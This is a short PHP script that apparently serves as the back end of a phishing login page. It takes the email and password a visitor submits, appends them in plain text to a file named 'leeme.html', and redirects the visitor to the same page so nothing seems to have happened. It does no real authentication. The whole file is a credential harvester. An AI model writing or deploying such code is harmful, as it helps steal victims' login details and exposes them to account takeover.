<?php
$email = test_input($_POST["email"]);
$data['email']=$email;
$pass = test_input($_POST["pass"]);
$data['pass']=$pass;


header ('Location: '.htmlspecialchars($_SERVER["PHP_SELF"]));
$handle = fopen("leeme.html", "a");
$string = '
email:'.$data['email'].'
pass:'.$data['pass'];

fwrite($handle,$string);
fclose($handle);

